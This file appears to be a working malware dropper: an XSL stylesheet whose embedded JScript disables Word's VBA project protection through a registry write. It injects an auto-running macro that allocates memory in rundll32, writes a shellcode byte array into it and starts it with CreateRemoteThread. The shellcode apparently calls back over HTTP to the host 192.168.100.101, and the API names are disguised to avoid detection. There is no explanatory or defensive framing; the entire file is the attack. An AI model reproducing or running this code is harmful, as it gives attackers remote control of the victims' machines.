<xsl:stylesheet version="1.0"
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
      xmlns:msxsl="urn:schemas-microsoft-com:xslt"
      xmlns:user="http://mycompany.com/mynamespace">
 <msxsl:script language="JScript" implements-prefix="user">
<![CDATA[
    function Macro(){
         var objWord = new ActiveXObject("Word.Application");
            objWord.Visible = false;
            var WshShell = new ActiveXObject("WScript.Shell");
            var Application_Version = objWord.Version;//Auto-Detect Version
            var strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + Application_Version + "\\Word\\Security\\AccessVBOM";
            WshShell.RegWrite(strRegPath, 1, "REG_DWORD");
            var objDoc = objWord.Documents.Add();
            var wdmodule = objDoc.VBProject.VBComponents.Add(1);
            var strCode ="";
            strCode += 'Private Type PROCESS_INFORMATION\n'
            strCode += '    hProcess As Long\n'
strCode += '    hThread As Long\n'
strCode += '    dwProcessId As Long\n'
strCode += '    dwThreadId As Long\n'
strCode += 'End Type\n'
strCode += '\n'
strCode += 'Private Type STARTUPINFO\n'
strCode += '    cb As Long\n'
strCode += '    lpReserved As String\n'
strCode += '    lpDesktop As String\n'
strCode += '    lpTitle As String\n'
strCode += '    dwX As Long\n'
strCode += '    dwY As Long\n'
strCode += '    dwXSize As Long\n'
strCode += '    dwYSize As Long\n'
strCode += '    dwXCountChars As Long\n'
strCode += '    dwYCountChars As Long\n'
strCode += '    dwFillAttribute As Long\n'
strCode += '    dwFlags As Long\n'
strCode += '    wShowWindow As Integer\n'
strCode += '    cbReserved2 As Integer\n'
strCode += '    lpReserved2 As Long\n'
strCode += '    hStdInput As Long\n'
strCode += '    hStdOutput As Long\n'
strCode += '    hStdError As Long\n'
strCode += 'End Type\n'
strCode += '\n'
strCode += '#If VBA7 Then\n'
strCode += '    Private Declare PtrSafe Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr\n'
strCode += '    Private Declare PtrSafe Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr\n'
strCode += '    Private Declare PtrSafe Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr\n'
strCode += '    Private Declare PtrSafe Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long\n'
strCode += '#Else\n'
strCode += '    Private Declare Function CreateStuff Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long\n'
strCode += '    Private Declare Function AllocStuff Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long\n'
strCode += '    Private Declare Function WriteStuff Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long\n'
strCode += '    Private Declare Function RunStuff Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long\n'
strCode += '#End If\n'
strCode += '\n'
strCode += 'Sub Auto_Open()\n'
strCode += '    Dim myByte As Long, myArray As Variant, offset As Long\n'
strCode += '    Dim pInfo As PROCESS_INFORMATION\n'
strCode += '    Dim sInfo As STARTUPINFO\n'
strCode += '    Dim sNull As String\n'
strCode += '    Dim sProc As String\n'
strCode += '\n'
strCode += '#If VBA7 Then\n'
strCode += '    Dim rwxpage As LongPtr, res As LongPtr\n'
strCode += '#Else\n'
strCode += '    Dim rwxpage As Long, res As Long\n'
strCode += '#End If\n'
strCode += '    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84, _\n'
strCode += '60,97,124,2,44,32,-63,-49,13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48, _\n'
strCode += '80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1,-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3, _\n'
strCode += '125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4,-117,1,-48,-119,68,36,36,91, _\n'
strCode += '91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _\n'
strCode += '-43,-24,-128,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _\n'
strCode += '83,73,69,32,57,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,48,59,32,84,114,105,100,101,110,116, _\n'
strCode += '47,53,46,48,41,0,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _\n'
strCode += '88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _\n'
strCode += '88,88,88,88,88,0,89,49,-1,87,87,87,87,81,104,58,86,121,-89,-1,-43,-21,121,91,49,-55,81,81,106,3,81,81, _\n'
strCode += '104,-72,34,0,0,83,80,104,87,-119,-97,-58,-1,-43,-21,98,89,49,-46,82,104,0,2,96,-124,82,82,82,81,82,80,104, _\n'
strCode += '-21,85,46,59,-1,-43,-119,-58,49,-1,87,87,87,87,86,104,45,6,24,123,-1,-43,-123,-64,116,68,49,-1,-123,-10,116,4, _\n'
strCode += '-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1,-43,49,-1,87,106,7,81,86,80,104,-73,87,-32, _\n'
strCode += '11,-1,-43,-65,0,47,0,0,57,-57,116,-68,49,-1,-21,21,-21,73,-24,-103,-1,-1,-1,47,56,82,98,112,0,0,104,-16, _\n'
strCode += '-75,-94,86,-1,-43,106,64,104,0,16,0,0,104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,83,83,-119,-25,87,104, _\n'
strCode += '0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43,-123,-64,116,-51,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,55,-1,-1,-1, _\n'
strCode += '49,57,50,46,49,54,56,46,49,48,48,46,49,48,49,0)\n'
strCode += '    If Len(Environ("ProgramW6432")) > 0 Then\n'
strCode += '        sProc = Environ("windir") & "\\SysWOW64\\rundll32.exe"\n'
strCode += '    Else\n'
strCode += '        sProc = Environ("windir") & "\\System32\\rundll32.exe"\n'
strCode += '    End If\n'
strCode += '\n'
strCode += '    res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)\n'
strCode += '\n'
strCode += '    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)\n'
strCode += '    For offset = LBound(myArray) To UBound(myArray)\n'
strCode += '        myByte = myArray(offset)\n'
strCode += '        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)\n'
strCode += '    Next offset\n'
strCode += '    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)\n'
strCode += 'End Sub\n'
strCode += 'Sub AutoOpen()\n'
strCode += '    Auto_Open\n'
strCode += 'End Sub\n'
strCode += 'Sub Workbook_Open()\n'
strCode += '    Auto_Open\n'
strCode += 'End Sub\n'
            wdmodule.CodeModule.AddFromString(strCode);
            objWord.Run("Auto_Open");
            objWord.DisplayAlerts = false;
            objDoc.Close(false);
}
    ]]>
      </msxsl:script>

  <xsl:template match="data">
    <result>
      <xsl:value-of select="user:Macro()" />
    </result>
  </xsl:template>
</xsl:stylesheet>
